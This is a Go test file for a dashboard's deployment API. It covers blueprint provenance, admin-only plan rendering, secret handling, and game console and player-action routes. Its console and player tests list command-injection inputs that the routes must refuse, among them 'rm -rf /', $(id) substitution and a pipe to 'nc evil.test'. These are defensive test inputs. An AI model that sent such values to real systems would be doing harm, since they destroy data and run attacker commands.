package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"testing"

	"github.com/Wayy01/Just-Dashboard/backend/internal/auth"
	"github.com/Wayy01/Just-Dashboard/backend/internal/blueprint"
	"github.com/Wayy01/Just-Dashboard/backend/internal/deploy"
)

func TestBlueprintCatalogueIsReadableAndNamesItsProvenance(t *testing.T) {
	s := testServer(t)
	client := &client{t: t, h: s.Routes(), cookie: signIn(t, s)}

	listed := client.do(http.MethodGet, "/api/v1/deploy/blueprints/", "", nil)
	if listed.Code != http.StatusOK {
		t.Fatalf("list = %d %s", listed.Code, listed.Body.String())
	}
	var summaries []blueprint.Summary
	if err := json.Unmarshal(listed.Body.Bytes(), &summaries); err != nil {
		t.Fatal(err)
	}
	if len(summaries) < 10 {
		t.Fatalf("catalogue returned %d blueprints", len(summaries))
	}
	for _, summary := range summaries {
		if summary.License == "" || summary.Maintainer == "" || summary.ReviewedAt == "" || summary.DocsURL == "" {
			t.Fatalf("%s is listed without provenance: %#v", summary.ID, summary)
		}
	}
	detail := client.do(http.MethodGet, "/api/v1/deploy/blueprints/minecraft-java", "", nil)
	if detail.Code != http.StatusOK {
		t.Fatalf("detail = %d %s", detail.Code, detail.Body.String())
	}
	var definition blueprint.Blueprint
	if err := json.Unmarshal(detail.Body.Bytes(), &definition); err != nil {
		t.Fatal(err)
	}
	if definition.ID != "minecraft-java" || len(definition.Inputs) == 0 {
		t.Fatalf("definition = %#v", definition)
	}
	eula := false
	for _, input := range definition.Inputs {
		if input.Kind == blueprint.InputAccept {
			eula = input.AcceptURL != "" && input.Required
		}
	}
	if !eula {
		t.Fatal("the Minecraft blueprint does not require a linked EULA acceptance")
	}
	if missing := client.do(http.MethodGet, "/api/v1/deploy/blueprints/not-a-blueprint", "", nil); missing.Code != http.StatusNotFound {
		t.Fatalf("unknown blueprint = %d", missing.Code)
	}
}

// Rendering is an admin, session-bound preview. Read capability alone must not
// produce the exact plan an operator is about to commit.
func TestBlueprintRenderRequiresAdminSessionAndRefusesUndeclaredInput(t *testing.T) {
	s := testServer(t)
	readOnly := &client{t: t, h: s.Routes(), cookie: signInAs(t, s, "viewer", auth.RoleReadOnly)}
	if refused := readOnly.do(http.MethodPost, "/api/v1/deploy/blueprints/minecraft-java/render",
		`{"inputs":{"eula":"true"}}`, nil); refused.Code != http.StatusForbidden {
		t.Fatalf("read-only render = %d %s", refused.Code, refused.Body.String())
	}

	admin := &client{t: t, h: s.Routes(), cookie: signIn(t, s)}
	rendered := admin.do(http.MethodPost, "/api/v1/deploy/blueprints/minecraft-java/render",
		`{"name":"survival","inputs":{"eula":"true","memory":"4096"}}`, nil)
	if rendered.Code != http.StatusOK {
		t.Fatalf("render = %d %s", rendered.Code, rendered.Body.String())
	}
	var plan deploy.BlueprintPlan
	if err := json.Unmarshal(rendered.Body.Bytes(), &plan); err != nil {
		t.Fatal(err)
	}
	if plan.Rendered == nil || plan.Rendered.Digest == "" || plan.Rendered.MemoryMB != 4096 {
		t.Fatalf("rendered plan = %#v", plan.Rendered)
	}
	// The game port is published directly because no HTTP proxy can carry it,
	// and a server holding a world cannot run two copies at once.
	if plan.Configuration.Runtime.HostPort != 25565 ||
		plan.Configuration.Runtime.Strategy != deploy.StrategyStopFirst {
		t.Fatalf("runtime plan = %#v", plan.Configuration.Runtime)
	}
	if len(plan.Configuration.Runtime.Mounts) != 1 ||
		!strings.HasPrefix(plan.Configuration.Runtime.Mounts[0].Source, "survival-") {
		t.Fatalf("mounts = %#v", plan.Configuration.Runtime.Mounts)
	}

	refusedEULA := admin.do(http.MethodPost, "/api/v1/deploy/blueprints/minecraft-java/render",
		`{"inputs":{"eula":"false"}}`, nil)
	if refusedEULA.Code != http.StatusUnprocessableEntity && refusedEULA.Code != http.StatusBadRequest {
		t.Fatalf("unaccepted EULA render = %d %s", refusedEULA.Code, refusedEULA.Body.String())
	}
	undeclared := admin.do(http.MethodPost, "/api/v1/deploy/blueprints/minecraft-java/render",
		`{"inputs":{"eula":"true","privileged":"true"}}`, nil)
	if undeclared.Code != http.StatusUnprocessableEntity && undeclared.Code != http.StatusBadRequest {
		t.Fatalf("undeclared input render = %d %s", undeclared.Code, undeclared.Body.String())
	}
}

// A rendered plan carries generated secrets by name only. Their values come
// from the planning store's own generator after the plan is committed.
func TestBlueprintRenderNeverReturnsAGeneratedSecretValue(t *testing.T) {
	s := testServer(t)
	admin := &client{t: t, h: s.Routes(), cookie: signIn(t, s)}
	rendered := admin.do(http.MethodPost, "/api/v1/deploy/blueprints/vaultwarden/render",
		`{"name":"vault","inputs":{"domain":"vault.example.test"}}`, nil)
	if rendered.Code != http.StatusOK {
		t.Fatalf("render = %d %s", rendered.Code, rendered.Body.String())
	}
	var plan deploy.BlueprintPlan
	if err := json.Unmarshal(rendered.Body.Bytes(), &plan); err != nil {
		t.Fatal(err)
	}
	token := false
	for _, variable := range plan.Rendered.Variables {
		if variable.Name != "ADMIN_TOKEN" {
			continue
		}
		token = true
		if !variable.Generated || variable.Value != "" || variable.Sensitivity != "secret" {
			t.Fatalf("admin token = %#v", variable)
		}
	}
	if !token {
		t.Fatal("the Vaultwarden plan declares no admin token")
	}
	for _, planned := range plan.Configuration.Variables {
		if planned.Name == "ADMIN_TOKEN" && planned.Sensitivity != "secret" {
			t.Fatalf("admin token reached the plan as %q", planned.Sensitivity)
		}
	}
}

func TestBlueprintVersionsAnswerPerProfileAndNeverInventAVersion(t *testing.T) {
	s := testServer(t)
	client := &client{t: t, h: s.Routes(), cookie: signIn(t, s)}
	for _, testCase := range []struct{ id, want string }{
		{"postgresql", "tag policy"},
		{"minecraft-bedrock", "no version index"},
	} {
		response := client.do(http.MethodGet, "/api/v1/deploy/blueprints/"+testCase.id+"/versions", "", nil)
		if response.Code != http.StatusOK {
			t.Fatalf("%s versions = %d %s", testCase.id, response.Code, response.Body.String())
		}
		var list struct {
			Status   string `json:"status"`
			Reason   string `json:"reason"`
			Versions []any  `json:"versions"`
		}
		if err := json.Unmarshal(response.Body.Bytes(), &list); err != nil {
			t.Fatal(err)
		}
		if list.Status != "unavailable" || !strings.Contains(list.Reason, testCase.want) || len(list.Versions) != 0 {
			t.Fatalf("%s versions = %#v", testCase.id, list)
		}
	}
}

// The game console is the one surface where an injection would reach a process
// inside a container, so every layer refuses separately: capability, profile
// and command shape.
func TestGameConsoleRefusesWithoutControlCapabilityOnANonGameDeploymentOrWithAShellString(t *testing.T) {
	s := testServer(t)
	project := createLegacyDeploymentFixture(t, s, "not-a-game")
	if _, err := s.Store.DB.ExecContext(t.Context(),
		"UPDATE deploy_projects SET profile = 'game' WHERE id = ?", project.ID); err != nil {
		t.Fatal(err)
	}
	path := fmt.Sprintf("/api/v1/deploy/%d/game/console", project.ID)

	readOnly := &client{t: t, h: s.Routes(), cookie: signInAs(t, s, "console-viewer", auth.RoleReadOnly)}
	if refused := readOnly.do(http.MethodPost, path, `{"command":"list"}`, nil); refused.Code != http.StatusForbidden {
		t.Fatalf("read-only console = %d %s", refused.Code, refused.Body.String())
	}

	admin := &client{t: t, h: s.Routes(), cookie: signIn(t, s)}
	for _, command := range []string{
		"say hello; rm -rf /", "say `id`", "say $(id)", "say a | nc evil.test 1", "say a\nstop", "",
	} {
		body, err := json.Marshal(map[string]string{"command": command})
		if err != nil {
			t.Fatal(err)
		}
		response := admin.do(http.MethodPost, path, string(body), nil)
		if response.Code != http.StatusBadRequest {
			t.Fatalf("console accepted %q with %d %s", command, response.Code, response.Body.String())
		}
	}

	// Without Docker there is no container to reach, and the route says so
	// rather than pretending the command ran.
	unavailable := admin.do(http.MethodPost, path, `{"command":"list"}`, nil)
	if unavailable.Code != http.StatusServiceUnavailable {
		t.Fatalf("console without a runtime = %d %s", unavailable.Code, unavailable.Body.String())
	}

	web := createLegacyDeploymentFixture(t, s, "ordinary-web")
	refusedProfile := admin.do(http.MethodPost,
		fmt.Sprintf("/api/v1/deploy/%d/game/console", web.ID), `{"command":"list"}`, nil)
	if refusedProfile.Code != http.StatusBadRequest ||
		!strings.Contains(refusedProfile.Body.String(), "not_a_game_server") {
		t.Fatalf("console on a web deployment = %d %s", refusedProfile.Code, refusedProfile.Body.String())
	}
}

func TestGamePlayerActionsAreClosedAtTheRoute(t *testing.T) {
	s := testServer(t)
	project := createLegacyDeploymentFixture(t, s, "player-actions")
	if _, err := s.Store.DB.ExecContext(t.Context(),
		"UPDATE deploy_projects SET profile = 'game' WHERE id = ?", project.ID); err != nil {
		t.Fatal(err)
	}
	admin := &client{t: t, h: s.Routes(), cookie: signIn(t, s)}
	for _, testCase := range []struct{ action, name string }{
		{"exec", "Notch"},
		{"kick", "rm -rf /"},
		{"kick", ""},
		{"whitelist_add", "name with space"},
	} {
		body, err := json.Marshal(map[string]string{"name": testCase.name})
		if err != nil {
			t.Fatal(err)
		}
		response := admin.do(http.MethodPost,
			fmt.Sprintf("/api/v1/deploy/%d/game/players/%s", project.ID, testCase.action), string(body), nil)
		if response.Code != http.StatusBadRequest {
			t.Fatalf("%s %q = %d %s", testCase.action, testCase.name, response.Code, response.Body.String())
		}
	}
}
